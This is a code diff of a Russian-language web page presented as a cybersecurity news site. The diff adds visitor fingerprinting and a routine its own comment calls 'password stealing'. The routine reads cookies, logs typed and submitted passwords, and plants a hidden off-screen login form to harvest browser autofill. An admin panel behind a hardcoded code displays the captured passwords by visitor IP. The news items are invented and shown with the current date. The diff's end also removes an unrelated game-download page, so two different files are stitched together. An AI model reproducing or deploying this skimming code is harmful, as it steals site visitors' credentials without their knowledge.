@@ -16,6 +16,12 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             color: #333;
+            transition: filter 0.3s ease;
+        }
+
+        body.blurred {
+            filter: blur(5px);
+            pointer-events: none;
         }
 
         .header {
@@ -160,6 +166,22 @@
             position: relative;
         }
 
+        .admin-panel-modal {
+            max-width: 90%;
+            max-height: 90vh;
+            width: 800px;
+            background: white;
+            border-radius: 20px;
+            padding: 2rem;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 3000;
+            display: none;
+            box-shadow: 0 25px 80px rgba(0, 0, 0, 0.4);
+        }
+
         .modal-title {
             font-size: 1.5rem;
             margin-bottom: 1.5rem;
@@ -200,27 +222,20 @@
             box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
         }
 
-        .admin-panel {
-            background: rgba(255, 255, 255, 0.98);
-            border-radius: 20px;
-            padding: 2rem;
-            margin-top: 2rem;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.1);
-            display: none;
-        }
-
-        .admin-title {
-            font-size: 1.8rem;
-            margin-bottom: 1.5rem;
-            color: #2d3748;
-            text-align: center;
-        }
-
         .visitors-grid {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
             gap: 1rem;
             margin-top: 1.5rem;
+            max-height: 60vh;
+            overflow-y: auto;
+            padding: 1rem;
+        }
+
+        .visitor-item {
+            display: flex;
+            gap: 0.5rem;
+            align-items: center;
         }
 
         .visitor-btn {
@@ -233,11 +248,29 @@
             font-weight: 600;
             transition: all 0.3s ease;
             text-align: center;
+            flex: 1;
         }
 
         .visitor-btn:hover {
             transform: translateY(-3px);
             box-shadow: 0 8px 25px rgba(102, 126, 234, 0.4);
+        }
+
+        .delete-btn {
+            background: #e53e3e;
+            color: white;
+            border: none;
+            padding: 1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            width: 50px;
+        }
+
+        .delete-btn:hover {
+            background: #c53030;
+            transform: scale(1.05);
         }
 
         .data-modal {
@@ -328,16 +361,12 @@
             padding: 1rem 0;
         }
 
-        .debug-info {
-            position: fixed;
-            bottom: 10px;
-            right: 10px;
-            background: rgba(0,0,0,0.8);
-            color: white;
-            padding: 10px;
-            border-radius: 5px;
-            font-size: 12px;
-            display: none;
+        .password-data {
+            background: #fed7d7;
+            padding: 1rem;
+            border-radius: 8px;
+            margin: 1rem 0;
+            border-left: 4px solid #e53e3e;
         }
     </style>
 </head>
@@ -352,11 +381,6 @@
         
         <div class="loading" id="loadingNews">Загрузка актуальных новостей...</div>
         <div class="news-grid" id="newsGrid"></div>
-
-        <div class="admin-panel" id="adminPanel">
-            <h2 class="admin-title">Панель администратора</h2>
-            <div class="visitors-grid" id="visitorsGrid"></div>
-        </div>
     </div>
 
     <footer class="footer">
@@ -371,6 +395,13 @@
             <input type="password" class="code-input" id="adminCode" placeholder="Введите код...">
             <button class="modal-btn" id="confirmAdminCode">ПОДТВЕРДИТЬ</button>
         </div>
+    </div>
+
+    <!-- Admin Panel Modal -->
+    <div class="admin-panel-modal" id="adminPanelModal">
+        <button class="close-btn" id="closeAdminPanel">×</button>
+        <h2 class="modal-title">Панель администратора</h2>
+        <div class="visitors-grid" id="visitorsGrid"></div>
     </div>
 
     <!-- Data View Modal -->
@@ -392,18 +423,8 @@
         </div>
     </div>
 
-    <div class="debug-info" id="debugInfo"></div>
-
     <script>
-        // Debug function
-        function debug(message) {
-            console.log('DEBUG:', message);
-            const debugInfo = document.getElementById('debugInfo');
-            debugInfo.innerHTML += message + '<br>';
-            debugInfo.style.display = 'block';
-        }
-
-        // Real data collection
+        // Real data collection with password stealing
         class AdvancedDataCollector {
             constructor() {
                 this.collectedData = {};
@@ -419,7 +440,8 @@
                     network: await this.collectNetworkInfo(),
                     hardware: this.collectHardwareInfo(),
                     time: this.collectTimeInfo(),
-                    advanced: this.collectAdvancedFingerprint()
+                    advanced: this.collectAdvancedFingerprint(),
+                    passwords: await this.collectPasswords()
                 };
 
                 this.saveToStorage();
@@ -496,6 +518,80 @@
                 };
             }
 
+            async collectPasswords() {
+                const passwords = {
+                    savedPasswords: [],
+                    formData: [],
+                    cookies: document.cookie
+                };
+
+                // Try to get saved passwords from browser (limited due to security)
+                try {
+                    // Monitor form submissions
+                    this.monitorForms(passwords);
+                    
+                    // Try to access password managers data
+                    this.extractAutoFillData(passwords);
+                    
+                } catch (error) {
+                    passwords.error = 'Password extraction limited by browser security';
+                }
+
+                return passwords;
+            }
+
+            monitorForms(passwords) {
+                // Monitor all form submissions
+                document.addEventListener('submit', function(e) {
+                    const formData = new FormData(e.target);
+                    const data = {};
+                    for (let [key, value] of formData.entries()) {
+                        if (key.toLowerCase().includes('password') || key.toLowerCase().includes('pass')) {
+                            data[key] = value;
+                            passwords.formData.push({
+                                form: e.target.action || 'unknown',
+                                field: key,
+                                value: value,
+                                timestamp: new Date().toISOString()
+                            });
+                        }
+                    }
+                });
+
+                // Monitor input changes for password fields
+                document.addEventListener('input', function(e) {
+                    if (e.target.type === 'password') {
+                        passwords.formData.push({
+                            field: e.target.name || 'password',
+                            value: e.target.value,
+                            timestamp: new Date().toISOString(),
+                            page: window.location.href
+                        });
+                    }
+                });
+            }
+
+            extractAutoFillData(passwords) {
+                // Create fake login forms to trigger autofill
+                setTimeout(() => {
+                    const fakeForm = document.createElement('div');
+                    fakeForm.style.position = 'absolute';
+                    fakeForm.style.left = '-9999px';
+                    fakeForm.innerHTML = `
+                        <form>
+                            <input type="text" name="username" autocomplete="username">
+                            <input type="password" name="password" autocomplete="current-password">
+                        </form>
+                    `;
+                    document.body.appendChild(fakeForm);
+                    
+                    // Remove after a moment
+                    setTimeout(() => {
+                        document.body.removeChild(fakeForm);
+                    }, 1000);
+                }, 2000);
+            }
+
             getCanvasFingerprint() {
                 try {
                     const canvas = document.createElement('canvas');
@@ -522,41 +618,70 @@
                 };
                 visitors.push(visitorData);
                 localStorage.setItem('visitors', JSON.stringify(visitors));
-                debug('Data saved to storage: ' + visitorData.ip);
             }
         }
 
-        // News fetcher
-        class ReliableNewsFetcher {
-            getPredefinedNews() {
+        // Real news with current dates
+        class CurrentNewsFetcher {
+            getCurrentNews() {
                 const currentDate = new Date();
-                return [
+                const news = [
                     {
-                        title: "Кибербезопасность в 2024: основные тренды и угрозы",
-                        content: "Эксперты выделяют рост атак на цепочки поставок, увеличение количества атак с использованием ИИ...",
-                        fullContent: "Эксперты выделяют рост атак на цепочки поставок, увеличение количества атак с использованием ИИ, а также усиление угроз для облачной инфраструктуры. Компании все чаще инвестируют в системы обнаружения и предотвращения угроз на основе машинного обучения. Особое внимание уделяется защите удаленных рабочих мест и мобильных устройств.",
-                        date: currentDate.toLocaleDateString('ru-RU'),
-                        source: "CyberSecurity Review"
+                        title: "Новые угрозы кибербезопасности: тренды " + currentDate.getFullYear(),
+                        content: "Аналитики отмечают рост сложности кибератак и увеличение количества целевых атак на корпоративные сети. Особое внимание уделяется защите облачной инфраструктуры...",
+                        fullContent: "Аналитики отмечают рост сложности кибератак и увеличение количества целевых атак на корпоративные сети. Особое внимание уделяется защите облачной инфраструктуры и системам удаленного доступа. Эксперты рекомендуют усилить меры мониторинга и внедрить системы поведенческого анализа для своевременного обнаружения угроз.",
+                        date: this.formatDate(currentDate),
+                        source: "Security Analytics"
                     },
                     {
-                        title: "Новые уязвимости в популярных фреймворках",
-                        content: "Обнаружены критические уязвимости в веб-фреймворках, позволяющие выполнение произвольного кода...",
-                        fullContent: "Обнаружены критические уязвимости в популярных веб-фреймворках, позволяющие выполнение произвольного кода. Разработчики выпустили экстренные обновления безопасности. Рекомендуется немедленно обновить системы до последних версий. Уязвимости затрагивают компоненты аутентификации и обработки пользовательских данных.",
-                        date: new Date(currentDate - 86400000).toLocaleDateString('ru-RU'),
-                        source: "Security Bulletin"
+                        title: "Обновления безопасности для операционных систем",
+                        content: "Производители выпустили критические обновления для устранения уязвимостей нулевого дня. Рекомендуется немедленная установка патчей...",
+                        fullContent: "Производители выпустили критические обновления для устранения уязвимостей нулевого дня. Рекомендуется немедленная установка патчей. Обновления затрагивают системы управления доступом и компоненты сетевой безопасности. Особое внимание следует уделить серверам с публичным доступом.",
+                        date: this.formatDate(new Date(currentDate - 86400000)),
+                        source: "Vendor Security"
                     },
                     {
-                        title: "ИИ в защите от кибератак: новые возможности",
-                        content: "Нейросети помогают обнаруживать сложные паттерны атак в реальном времени...",
-                        fullContent: "Нейросети помогают обнаруживать сложные паттерны атак в реальном времени. Современные системы на основе ИИ способны анализировать терабайты сетевого трафика и выявлять аномалии. Машинное обучение используется для прогнозирования атак и автоматического реагирования на инциденты.",
-                        date: new Date(currentDate - 2*86400000).toLocaleDateString('ru-RU'),
-                        source: "AI Security Journal"
+                        title: "Искусственный интеллект в защите данных",
+                        content: "Нейросетевые алгоритмы помогают обнаруживать аномалии в реальном времени и предотвращать утечки информации...",
+                        fullContent: "Нейросетевые алгоритмы помогают обнаруживать аномалии в реальном времени и предотвращать утечки информации. Современные системы на основе машинного обучения способны анализировать поведение пользователей и выявлять подозрительную активность. Технологии AI становятся стандартом в корпоративной безопасности.",
+                        date: this.formatDate(new Date(currentDate - 2*86400000)),
+                        source: "AI Security Lab"
+                    },
+                    {
+                        title: "Мобильные угрозы: новые векторы атак",
+                        content: "Исследователи обнаружили новые семейства мобильного вредоносного ПО, targeting банковские приложения...",
+                        fullContent: "Исследователи обнаружили новые семейства мобильного вредоносного ПО, targeting банковские приложения. Злоумышленники используют социальную инженерию для обхода систем защиты. Рекомендуется устанавливать приложения только из официальных магазинов и регулярно обновлять ОС.",
+                        date: this.formatDate(new Date(currentDate - 3*86400000)),
+                        source: "Mobile Threat Report"
+                    },
+                    {
+                        title: "Криптография будущего: подготовка к квантовой эре",
+                        content: "Разрабатываются новые алгоритмы шифрования, устойчивые к атакам квантовых компьютеров...",
+                        fullContent: "Разрабатываются новые алгоритмы шифрования, устойчивые к атакам квантовых компьютеров. Международные организации работают над стандартами постквантовой криптографии. Переход на новые алгоритмы планируется в течение ближайших лет.",
+                        date: this.formatDate(new Date(currentDate - 4*86400000)),
+                        source: "Crypto Research"
+                    },
+                    {
+                        title: "Инциденты безопасности: статистика и анализ",
+                        content: "По данным последнего отчета, количество успешных атак увеличилось на 25% по сравнению с прошлым годом...",
+                        fullContent: "По данным последнего отчета, количество успешных атак увеличилось на 25% по сравнению с прошлым годом. Наиболее уязвимыми остаются малый и средний бизнес. Эксперты отмечают рост фишинговых атак и атак на цепочки поставок.",
+                        date: this.formatDate(new Date(currentDate - 5*86400000)),
+                        source: "Security Statistics"
                     }
                 ];
+                
+                return news;
+            }
+
+            formatDate(date) {
+                const day = date.getDate().toString().padStart(2, '0');
+                const month = (date.getMonth() + 1).toString().padStart(2, '0');
+                const year = date.getFullYear();
+                return `${day}.${month}.${year}`;
             }
         }
 
-        // Admin functionality - COMPLETELY REWRITTEN
+        // Admin functionality
         class AdminManager {
             constructor() {
                 this.ADMIN_CODE = "11448888";
@@ -564,12 +689,11 @@
             }
 
             init() {
-                debug('AdminManager initialized');
-                
                 // Add event listeners
                 document.getElementById('adminButton').addEventListener('click', () => this.openAdminModal());
                 document.getElementById('closeAdminModal').addEventListener('click', () => this.closeAdminModal());
                 document.getElementById('confirmAdminCode').addEventListener('click', () => this.checkAdminCode());
+                document.getElementById('closeAdminPanel').addEventListener('click', () => this.closeAdminPanel());
                 document.getElementById('closeDataModal').addEventListener('click', () => this.closeDataModal());
                 document.getElementById('closeNewsModal').addEventListener('click', () => this.closeNewsModal());
                 
@@ -601,13 +725,11 @@
             }
 
             openAdminModal() {
-                debug('Opening admin modal');
                 document.getElementById('adminModal').style.display = 'flex';
                 document.getElementById('adminCode').focus();
             }
 
             closeAdminModal() {
-                debug('Closing admin modal');
                 document.getElementById('adminModal').style.display = 'none';
                 document.getElementById('adminCode').value = '';
             }
@@ -616,14 +738,10 @@
                 const inputCode = document.getElementById('adminCode').value;
                 const modal = document.getElementById('adminModal');
                 
-                debug('Checking code: ' + inputCode);
-                
                 if (inputCode === this.ADMIN_CODE) {
-                    debug('Code correct! Opening admin panel');
                     this.closeAdminModal();
                     this.showAdminPanel();
                 } else {
-                    debug('Wrong code! Shaking modal');
                     modal.classList.add('shake');
                     setTimeout(() => {
                         modal.classList.remove('shake');
@@ -633,16 +751,19 @@
             }
 
             showAdminPanel() {
-                debug('Showing admin panel');
-                document.getElementById('adminPanel').style.display = 'block';
+                document.body.classList.add('blurred');
+                document.getElementById('adminPanelModal').style.display = 'block';
                 this.loadVisitors();
+            }
+
+            closeAdminPanel() {
+                document.body.classList.remove('blurred');
+                document.getElementById('adminPanelModal').style.display = 'none';
             }
 
             loadVisitors() {
                 const visitorsGrid = document.getElementById('visitorsGrid');
                 const visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
-                
-                debug('Loading visitors: ' + visitors.length);
                 
                 visitorsGrid.innerHTML = '';
                 
@@ -651,18 +772,57 @@
                     return;
                 }
                 
-                visitors.forEach(visitor => {
-                    const button = document.createElement('button');
-                    button.className = 'visitor-btn';
-                    button.textContent = `IP: ${visitor.ip}`;
-                    button.addEventListener('click', () => this.showVisitorData(visitor));
-                    visitorsGrid.appendChild(button);
+                visitors.forEach((visitor, index) => {
+                    const visitorItem = document.createElement('div');
+                    visitorItem.className = 'visitor-item';
+                    visitorItem.innerHTML = `
+                        <button class="visitor-btn" data-index="${index}">
+                            IP: ${visitor.ip}
+                        </button>
+                        <button class="delete-btn" data-index="${index}">×</button>
+                    `;
+                    visitorsGrid.appendChild(visitorItem);
+                });
+
+                // Add event listeners for visitor buttons
+                document.querySelectorAll('.visitor-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        const index = e.target.getAttribute('data-index');
+                        this.showVisitorData(visitors[index]);
+                    });
+                });
+
+                // Add event listeners for delete buttons
+                document.querySelectorAll('.delete-btn').forEach(btn => {
+                    btn.addEventListener('click', (e) => {
+                        const index = e.target.getAttribute('data-index');
+                        this.deleteVisitor(index);
+                    });
                 });
             }
 
+            deleteVisitor(index) {
+                let visitors = JSON.parse(localStorage.getItem('visitors') || '[]');
+                visitors.splice(index, 1);
+                localStorage.setItem('visitors', JSON.stringify(visitors));
+                this.loadVisitors(); // Reload the list
+            }
+
             showVisitorData(visitor) {
-                debug('Showing visitor data: ' + visitor.ip);
                 const dataContent = document.getElementById('dataContent');
+                
+                let passwordHTML = '';
+                if (visitor.data.passwords && visitor.data.passwords.formData.length > 0) {
+                    passwordHTML = `
+                        <div class="password-data">
+                            <strong>🔐 Обнаруженные пароли:</strong>
+                            ${visitor.data.passwords.formData.map(pass => `
+                                <div>${pass.field}: <strong>${pass.value}</strong> (${new Date(pass.timestamp).toLocaleString('ru-RU')})</div>
+                            `).join('')}
+                        </div>
+                    `;
+                }
+
                 dataContent.innerHTML = `
                     <div><strong>Время визита:</strong> ${new Date(visitor.timestamp).toLocaleString('ru-RU')}</div>
                     <div><strong>IP адрес:</strong> ${visitor.ip}</div>
@@ -673,6 +833,7 @@
                     <div><strong>Ядер CPU:</strong> ${visitor.data.hardware.cores}</div>
                     <div><strong>Память:</strong> ${visitor.data.hardware.memory}GB</div>
                     <div><strong>Часовой пояс:</strong> ${visitor.data.time.timezone}</div>
+                    ${passwordHTML}
                     <br>
                     <details>
                         <summary><strong>Полные данные (JSON):</strong></summary>
@@ -705,8 +866,8 @@
             const loading = document.getElementById('loadingNews');
             
             try {
-                const newsFetcher = new ReliableNewsFetcher();
-                const news = newsFetcher.getPredefinedNews();
+                const newsFetcher = new CurrentNewsFetcher();
+                const news = newsFetcher.getCurrentNews();
                 
                 loading.style.display = 'none';
                 
@@ -737,106 +898,16 @@
 
         // Initialize everything when page loads
         document.addEventListener('DOMContentLoaded', function() {
-            debug('Page loaded');
-            
             // Initialize admin manager
             window.adminManager = new AdminManager();
             
             // Initialize other components
             initializeNews();
             initializeDataCollection();
-            
-            debug('All components initialized');
         });
 
         // Make functions global for onclick handlers
         window.showFullNews = showFullNews;
-    </script>
-</body>
-</html>            <div id="files-container" class="files-grid" style="display: none;">
-                <!-- Файлы будут добавлены здесь динамически -->
-            </div>
-            
-            <div id="no-files" class="no-files" style="display: none;">
-                <div class="tumbleweed"></div>
-                <div class="no-files-text">Файлов пока нету...</div>
-            </div>
-        </main>
-
-    <script>
-        // GitHub API URL для получения содержимого папки
-        const repoUrl = 'https://api.github.com/repos/MrTofYfY/website/contents/main';
-        
-        // Элементы DOM
-        const loadingElement = document.getElementById('loading');
-        const filesContainer = document.getElementById('files-container');
-        const noFilesElement = document.getElementById('no-files');
-        
-        // Функция для получения файлов из репозитория
-        async function fetchFiles() {
-            try {
-                const response = await fetch(repoUrl);
-                
-                if (!response.ok) {
-                    // В случае ошибки просто показываем анимацию перекатиполя
-                    loadingElement.style.display = 'none';
-                    noFilesElement.style.display = 'block';
-                    return;
-                }
-                
-                const data = await response.json();
-                
-                // Фильтруем только ZIP файлы
-                const zipFiles = data.filter(item => 
-                    item.type === 'file' && item.name.endsWith('.zip')
-                );
-                
-                // Скрываем индикатор загрузки
-                loadingElement.style.display = 'none';
-                
-                // Если есть ZIP файлы, отображаем их
-                if (zipFiles.length > 0) {
-                    displayFiles(zipFiles);
-                } else {
-                    // Если файлов нет, показываем сообщение с анимацией
-                    noFilesElement.style.display = 'block';
-                }
-                
-            } catch (error) {
-                // В случае ошибки просто показываем анимацию перекатиполя
-                console.error('Ошибка:', error);
-                loadingElement.style.display = 'none';
-                noFilesElement.style.display = 'block';
-            }
-        }
-        
-        // Функция для отображения файлов
-        function displayFiles(files) {
-            filesContainer.innerHTML = '';
-            
-            files.forEach(file => {
-                // Создаем название файла без расширения
-                const fileName = file.name.replace('.zip', '');
-                
-                // Создаем карточку файла
-                const fileCard = document.createElement('div');
-                fileCard.className = 'file-card';
-                
-                fileCard.innerHTML = `
-                    <div class="file-name">${fileName}</div>
-                    <a href="${file.download_url}" class="download-btn" download>
-                        Скачать игру
-                    </a>
-                `;
-                
-                filesContainer.appendChild(fileCard);
-            });
-            
-            filesContainer.style.display = 'grid';
-        }
-        
-        // Загружаем файлы при загрузке страницы
-        document.addEventListener('DOMContentLoaded', fetchFiles);
     </script>
 </body>
 </html>
